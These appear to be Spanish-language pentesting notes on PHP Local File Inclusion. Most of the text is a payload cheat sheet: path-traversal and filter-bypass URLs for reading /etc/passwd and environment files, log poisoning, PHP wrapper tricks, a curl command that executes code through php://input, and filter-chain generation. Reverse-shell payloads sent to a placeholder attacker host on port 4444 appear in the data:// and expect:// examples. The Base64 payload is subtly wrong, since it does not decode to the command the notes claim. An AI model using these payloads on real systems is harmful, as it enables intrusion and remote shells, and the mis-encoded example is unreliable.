
---
Tags: #lfi #database #explotación #Exploitation #wrappers #chains #cadenas

---
# Definición

**[[LFI - Local File Inclusion]]** es una vulnerabilidad en aplicaciones web que permite a un atacante incluir archivos locales del servidor mediante la manipulación de parámetros de entrada. Esta vulnerabilidad se presenta cuando una aplicación utiliza funciones como `include()`, `require()`, `fopen()`, entre otras, sin una adecuada validación de los datos proporcionados por el usuario. El atacante puede entonces acceder a archivos sensibles del sistema, como `/etc/passwd`, o incluso ejecutar código malicioso si se combina con otras vulnerabilidades.

---
# 🔍 Tipos de LFI

### 1. **Acceso a Archivos Sensibles**

El atacante manipula el parámetro de entrada para acceder a archivos críticos del sistema, como:

- `/etc/passwd`
    
- `/etc/hostname`
    
- `/var/log/apache2/access.log`
    
- `/var/log/syslog`
    

**Ejemplo de explotación:**
```html
http://victima.com/index.php?page=../../../../../../etc/passwd
```
### 2. **Ejecución de Código Malicioso (RCE)**

Si la aplicación incluye archivos que contienen código ejecutable, un atacante podría inyectar código malicioso para su ejecución.

**Ejemplo de explotación:**
```html
http://victima.com/index.php?page=../../../../../../var/log/apache2/access.log
```
### 3. **Inyección de Null Byte (%00)**

En versiones antiguas de PHP (anteriores a 5.3.4), se podía utilizar el byte nulo (`%00`) para truncar la cadena de inclusión y evitar la extensión `.php`.

**Ejemplo de explotación:**
```html
http://victima.com/index.php?page=../../../../../../etc/passwd%00
```

Sin embargo, esta técnica ha sido **deshabilitada** en **versiones recientes** de PHP debido a mejoras en la seguridad.

### 4. **Codificación Doble y Variaciones en el Path**

Los atacantes pueden emplear codificación doble (`%252e`) o combinaciones de barras (`/././`) para evadir filtros de seguridad.

**Ejemplo de explotación:**
```html
http://victima.com/index.php?page=../../../../../../etc/./passwd
```

**Codificación Doble (`%252e%252e%252f`)**

>La codificación doble implica aplicar la codificación URL dos veces. Por ejemplo, `../` se codifica como `%2e%2e%2f`, y al codificarlo nuevamente, se obtiene `%252e%252e%252f`. Esto puede eludir filtros que solo decodifican una vez.[GitHub](https://github.com/cyberheartmi9/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/README.md?utm_source=chatgpt.com)[PortSwigger+1Wikipedia+1](https://portswigger.net/web-security/file-path-traversal?utm_source=chatgpt.com)

**Ejemplo:**
```html
http://victima.com/index.php?page=%252e%252e%252fetc%252fpasswd
```
``
>En este caso, `%252e%252e%252f` se decodifica dos veces para obtener `../../etc/passwd`.


```html
http://victima.com/index.php?page=....//....//....//....//....//....//etc/passwd
```

### 5. **Uso de Wrappers de PHP**

PHP ofrece **wrappers** como `php://filter` que permiten leer archivos con filtros aplicados, como la codificación Base64.

**Ejemplo de explotación:**
```html
http://victima.com/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

Esto devuelve el contenido del archivo `/etc/passwd` codificado en Base64.

---
## 🛡️ Prevención y Mitigación

Para protegerse contra LFI, se recomienda:

- **Validar y sanitizar** todas las entradas del usuario.
    
- **Evitar el uso de funciones de inclusión de archivos con entradas no controladas.**
    
- **Implementar listas blancas** de archivos permitidos.
    
- **Deshabilitar wrappers innecesarios** en la configuración de PHP.
    
- **Utilizar funciones como `realpath()`** para resolver rutas absolutas y compararlas con rutas permitidas.
    
---
# 🔧 Técnicas Avanzadas de Explotación

### A. **Inyección de Código en Archivos de Log**

Un atacante puede inyectar código malicioso en archivos de log accesibles y luego incluirlos para su ejecución.[Medium](https://medium.com/%40RosanaFS/tryhackme-file-inclusion-path-traversal-9f99395562c8?utm_source=chatgpt.com)

**Ejemplo de explotación:**
```html
http://victima.com/index.php?page=../../../../../../var/log/apache2/access.log
```
### B. **Acceso a Variables de Entorno**

En sistemas Linux, es posible acceder a las variables de entorno del proceso mediante la inclusión de `/proc/self/environ`.

**Ejemplo de explotación:**
```html
http://victima.com/index.php?page=../../../../../../proc/self/environ
```

Esto puede revelar información sensible del entorno del servidor.

## 🔎 Índice

1. [Metodología Básica](#metodología-básica)  
2. [Wrappers Más Usados](#wrappers-más-usados)  
3. [Ejemplos Prácticos y Reverse Shells](#ejemplos-prácticos-y-reverse-shells)  
4. [Wrappers Avanzados & Chains](#wrappers-avanzados--chains)  
5. [Bypass de Filtros & Tips](#bypass-de-filtros--tips)
6. [Resumen de Wrappers y Utilidad](#resumen-de-wrappers-y-utilidad)  

---

## 1️⃣ [Metodología Básica](#metodología-básica)

> [!info] **¿En qué consiste LFI?**  
> 1. La aplicación hace `include($_GET['file']);` sin validar.  
> 2. Atacante controla `?file=…` apuntando a `/etc/passwd`, logs con código PHP, etc.  
> 3. Con wrappers especiales “enganchamos” streams para leer o ejecutar.  

---

## 2️⃣ Wrappers Más Usados

| Wrapper                                  | Acción / Descripción                                                       |
|------------------------------------------|-----------------------------------------------------------------------------|
| `data://text/plain;base64,…`             | Inyecta PHP embebido en Base64→texto plano→ejecuta                          |
| `expect://<bin>?<cmd>`                   | Llama a un binario del sistema y ejecuta `<cmd>`                            |
| `php://input`                            | Lee el cuerpo de la petición HTTP como si fuese un archivo PHP               |
| `php://filter/read=string.rot13/...`     | Aplica ROT13 al contenido (necesita decodificación en cliente)              |
| `php://filter/convert.base64-encode/...` | Codifica en Base64 el recurso indicado                                        |
| `php://filter/convert.iconv.F.T/...`     | Transcodifica entre codificaciones (UTF‑8→UTF‑7, etc.) para evadir filtros   |
| `zip://<zipfile>#<file>`                 | Lee un archivo dentro de un ZIP                                             |
| `phar://<pharfile>`                      | Carga un PHAR (puede deserializar y ejecutar gadgets)                       |
| `compress.zlib://<file>`                 | Descomprime on‑the‑fly                                                       |
| `php://temp`, `php://memory`             | Crear recursos en memoria y luego incluir                                    |

---

## 3️⃣ Ejemplos Prácticos y Reverse Shells

#### 3.1 `data://text/plain;base64,…`

> [!example]  
> Incluir y ejecutar PHP en Base64  
> ```url
> /vuln.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJicmEgaSA+JiAvZGV2L3RjcC9MQUNBTF9JUDQvNDQ0NCAwPiYxIik7ID8+
> ```  
> → decodifica `<?php system("bash -i >& /dev/tcp/LACAL_IP4/4444 0>&1"); ?>`

#### 3.2 `expect://`

> [!example]  
> Ejecutar `whoami`:  
> ```url
> /vuln.php?file=expect://usr/bin/whoami
> ```

> [!example]  
> Reverse shell:  
> ```url
> /vuln.php?file=expect://usr/bin/bash?bash -i >& /dev/tcp/LACAL_IP4/4444 0>&1
> ```

#### 3.3 `php://input`

> [!example]  
> ```bash
> curl -X POST -d '<?php system("id"); ?>' "http://victim/vuln.php?file=php://input"
> ```

#### 3.4 `php://filter/read=string.rot13/resource=<file>`

> [!example]  
> ```url
> /vuln.php?file=php://filter/read=string.rot13/resource=index.php
> ```  
> → Copia salida y ejecuta:  
> ```bash
> tr 'A-Za-z' 'N-ZA-Mn-za-m' < dump.txt
> ```

#### 3.5 `php://filter/convert.base64-encode/resource=<file>`

> [!example]  
> ```url
> /vuln.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
> ```  
> → Decodifica: `base64 -d`

#### 3.6 `php://filter/convert.iconv.UTF8.UTF7/resource=<file>`

> [!example]  
> ```url
> /vuln.php?file=php://filter/convert.iconv.UTF8.UTF7/resource=index.php
> ```  
> → Interpreta contenido en UTF‑7 para bypass de filtros.

---

## 4️⃣ Wrappers Avanzados & Filter Chains – Explicación Detallada

En entornos donde **`allow_url_include`** está deshabilitado y no puedes subir archivos, las **filter chains** de PHP te permiten inyectar y ejecutar código **sin crear ningún fichero**. Veamos cómo funcionan paso a paso.

---

### 🧩 ¿Qué es un “filter chain”?

1. **Filter**: Un filtro PHP es una rutina que transforma el contenido de un _stream_ (archivo, entrada, etc.).  
2. **Chain**: Enlazas varios filtros uno tras otro, de modo que la salida de uno sea la entrada del siguiente.  
3. **Wrapper**: Usas `php://filter` como _wrapper_ para aplicar la cadena de filtros a un recurso (p. ej. `php://temp`, memoria, o un archivo específico).

---

### ⚙️ Mecanismo interno

1.  **Include inicial**  
   La aplicación hace algo como:
   ```php
   include($_GET['file']);
````

2. **php://filter wrapper**  
    La URL `file=php://filter/<cadena>/resource=php://temp` le indica a PHP que:
    
    - Abra un _stream_ en memoria (`php://temp`).
        
    - Aplique tu `filter chain` leyendo de él.
        
3. **php://temp**
    
    - Es un stream vacío pero **escribible**: PHP lo carga como “archivo” y luego tu código inyectado se escribe ahí.
        
    - Cuando “incluyes” el stream, PHP lo interpreta como si fuera un archivo físico.
        
4. **Inyección de tu PHP**
    
    - La `filter chain` decodifica y transforma tu base64 u otras codificaciones hasta producir el PHP en texto plano.
        
    - Al final, PHP ejecuta ese texto como código.

### 🔧 Uso de [[Php_filter_chain_generator.py]]

Este script genera automáticamente la cadena de filtros necesaria para que tu payload (p. ej. `<?php phpinfo(); ?>`) acabe visible en el _stream_:
```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  ' 
```

-  Salida (ejemplo): php://filter/   convert.iconv.UTF8.CSISO2022KR|   convert.base64-encode|   convert.iconv.UTF8.UTF7|   convert.iconv.SE2.UTF-16|   … (varios pasos más) …|   convert.base64-decode| /resource=php://temp

- Cada **`convert.iconv.X.Y`** recodifica el stream de la codificación **X** a **Y**.
    
- Los pasos de **`base64-encode`** y **`base64-decode`** introducen/retiran capas de cifrado para esquivar filtros que busquen texto PHP directo.
    
- Al final, **`resource=php://temp`** indica que todo el pipeline lee de un recurso en memoria donde PHP cargará tu código.
    

---

### 🔍 Desglose de un fragmento de cadena

Imagina parte de tu chain así:

|Paso|Función|
|---|---|
|`convert.iconv.UTF8.CSISO2022KR`|Transforma de UTF‑8 → CSISO2022KR (cambia bytes)|
|`convert.base64-encode`|Base64‑encodes los datos actuales|
|`convert.iconv.UTF8.UTF7`|UTF‑8 → UTF‑7 (introduce símbolos ‘+’, ‘/’ que pueden pasar filtros)|
|…|… (varios convert.iconv a diferentes codificaciones)|
|`convert.base64-decode`|Decodifica la capa de Base64, revelando finalmente el payload PHP original|

Al concatenar docenas de estos pasos, el texto original `<?php phpinfo(); ?>` queda **oculto** en múltiples capas de codificación y recodificación, hasta que el último filtro lo deja listo para PHP.


## 6️⃣ Resumen de Wrappers y Utilidad

|Wrapper|Utilidad / Ejemplo|
|---|---|
|`data://text/plain;base64,…`|Embebe PHP codificado y lo ejecuta (RCE)|
|`expect://<bin>?<cmd>`|Llama a binarios del sistema y ejecuta|
|`php://input`|Incluye código enviado en POST|
|`php://filter/read=string.rot13/resource=<file>`|ROT13 + decode manual|
|`php://filter/convert.base64-encode/resource=<file>`|Base64 → decodificar en cliente|
|`php://filter/convert.iconv.FROM.TO/resource=<file>`|Transcodifica para evadir filtros|
|`zip://<zipfile>#<file>`|Leer contenido dentro de ZIP|
|`phar://<pharfile>`|Deserializar/ejecutar gadgets desde PHAR|
|`compress.zlib://<file>`|Descomprimir on‑the‑fly|
|`php://temp`, `php://memory`|Recursos en memoria temporales para filter chains|
